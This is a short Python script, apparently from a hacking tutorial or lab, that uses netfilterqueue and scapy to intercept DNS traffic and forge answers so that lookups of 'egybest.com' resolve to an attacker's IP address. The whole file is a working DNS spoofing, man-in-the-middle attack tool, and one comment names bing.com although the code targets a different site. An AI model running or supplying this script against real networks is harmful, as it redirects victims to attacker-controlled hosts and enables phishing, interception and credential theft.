from netfilterqueue import NetfilterQueue
import scapy.all as scapy


def inject_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	target_website = "egybest.com"	#when the target machine starts searching for bing.com dns spoofing will be run
	evil_ip = "10.0.2.13" #ip of the attacker or any ip corresponding to the attacker
	if scapy_packet.getlayer(scapy.DNS):
		#getting requested website name
		qname = scapy_packet[scapy.DNSQR].qname
		if target_website in str(qname):
			#creating a fake response to put an evil ip back to the spoofed target
			forged_response = scapy.DNSRR(rrname = qname,rdata = evil_ip)
			#setting the answer field  of the scapy dns packet to the forged response
			scapy_packet[scapy.DNS].an = forged_response
			#setting the count of response parameter to 1 instead of 4
			scapy_packet[scapy.DNS].ancount = 1

			
			#deleting the scapy fields so that scapy can re-calculate the fields on the new forged packet		
			del scapy_packet[scapy.IP].len 
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].chksum 
			del scapy_packet[scapy.UDP].len
		
		#setting the packet's payload to that forged response		
		packet.set_payload(bytes(scapy_packet))
		
		
	#forwarding the packet once more
	packet.accept()
	




nfqueue = NetfilterQueue()
nfqueue.bind(0, inject_packet)
try:
	print("[+] waiting for data")
	nfqueue.run()
except KeyboardInterrupt:
	print("\n[-]	Quitting	....")
